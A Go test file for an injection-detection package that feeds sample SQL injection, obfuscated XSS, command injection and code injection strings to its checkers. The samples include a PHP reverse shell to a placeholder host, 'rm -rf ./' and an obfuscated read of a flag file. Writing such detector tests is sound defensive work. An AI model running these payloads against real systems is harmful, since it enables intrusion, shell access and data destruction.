package injection

import (
	"fmt"
	"testing"
)

func TestSQLInjection(t *testing.T) {
	var sqlInjection SQLInjection
	fmt.Println(sqlInjection.Check("union select * from users").Error())
	fmt.Println(sqlInjection.Check("and length(database())=2").Error())
	fmt.Println(sqlInjection.Check("select column_name  from information_schema.tables where table_name=0x7573657273").Error())
	fmt.Println(sqlInjection.Check("se/**/lect * from users").Error())
}

func TestXSSInjection(t *testing.T) {
	var xssInjection XSSInjection
	fmt.Println(xssInjection.Check("<script>alert('XSS');</script>").Error())
	fmt.Println(xssInjection.Check(`<im/**/g src=1 oneerror="alert(1)"/>`).Error())
	fmt.Println(xssInjection.Check("<scri<!--test--> pt> alert(1);</scr<!--test--> ipt>").Error())
	fmt.Println(xssInjection.Check("\\u003cscript\u003ealert(document.domain);\\u003c/script\\u003e").Error())
}

func TestCommandInjection(t *testing.T) {
	var commandInjection CommandInjection
	fmt.Println(commandInjection.Check(`$sock=fsockopen("IP",PORT);exec("/bin/bash -i 0>&3 1>&3 2>&3");`))
	fmt.Println(commandInjection.Check("rm -rf ./"))
	fmt.Println(commandInjection.Check("ca${s}t%20/fl${a}ag"))
}

func TestCodeInjection(t *testing.T) {
	var codeInjection CodeInjection
	fmt.Print(codeInjection.Check(`os.Command("rm -rf ./")`).Error())
}
